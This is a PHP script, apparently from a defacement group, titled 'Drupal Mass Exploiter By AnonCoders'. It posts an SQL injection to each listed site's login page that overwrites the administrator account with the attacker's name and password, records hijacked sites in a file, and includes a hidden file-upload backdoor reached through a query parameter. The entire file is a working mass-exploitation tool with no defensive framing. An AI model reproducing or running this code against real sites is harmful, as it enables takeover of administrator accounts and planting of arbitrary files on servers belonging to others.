<?php
echo '<img src="http://zonehmirrors.org/defaced/2015/06/12/iphone.saikhuan.com/s12.postimg.org/3yuzhbjq5/11167990_1406884862971778_8301585761560235991_n.jpg" width="0" height="0">';
{
echo "
<script>
document.getElementById('exit').innerHTML='';
</script>
<!Doctype HTML>
<html>
<head>
<title>Drupal Mass Exploiter By AnonCoders</title>
<style type='text/css'>
body{
background:url('') no-repeat center;
font-family:Batang;
background-color:black;
}
textarea{
margin-top:none;
font-family:Batang;
color:green;
border-radius:2px;
box-shadow:0px 0px 20px green;
border-left:2px solid green;
border-top:2px solid green;
border-bottom:1px solid green;
border-right:1px solid green;
}
}
input{
font-family:Batang;
color:green;
border-radius:2px;
box-shadow:0px 0px 20px red;
border:2px solid red;
}
</style>
</head>
<body>
<center>
<h1 style='color:green;text-shadow:0.5px 0px 0px white;'>Drupal Mass Exploiter By AnonCoders </h1>
<form method='post' action=''>
<textarea name='url' rows='30' cols='50'>
http://www.site.com
http://www.site2.com
</textarea><br><br>
<input type='submit' name='submit' value='Attack'>
</form>
<br>
";
$drupal7  = $_GET['drupal7'];
if($drupal7 == 'drupal7'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form>";
move_uploaded_file($filetmp,$filename);
}
    error_reporting(0);
    if (isset($_POST['submit'])) {
        function exploit($url) {
            $post_data = "name[0;update users set name %3D 'AnonCoders' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
            $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
            $ctx = stream_context_create($params);
            $data = file_get_contents($url . '/user/login/', null, $ctx);
            if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                $fp = fopen("exploited.txt", 'a+');
                fwrite($fp, "Exploitied  User: AnonCoders Pass: admin  =====> {$url}/user/login");
                fwrite($fp, "
");
                fwrite($fp, "--------------------------------------------------------------------------------------------------");
                fwrite($fp, "
");
                fclose($fp);
                               
                echo "<font color='gold'><b>Success:<font color='red'> AnonCoders</font> Pass:<font color='red'> admin</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
            } else {
                echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
            }
        }
               
        $urls = explode("
", $_POST['url']);
        foreach ($urls as $url) {
            $url = @trim($url);
            echo exploit($url);
        }
    }
}
echo "<br />";
echo'<center><a href="exploited.txt">View Exploited Drupal Sites</a></cenrer>';
?>
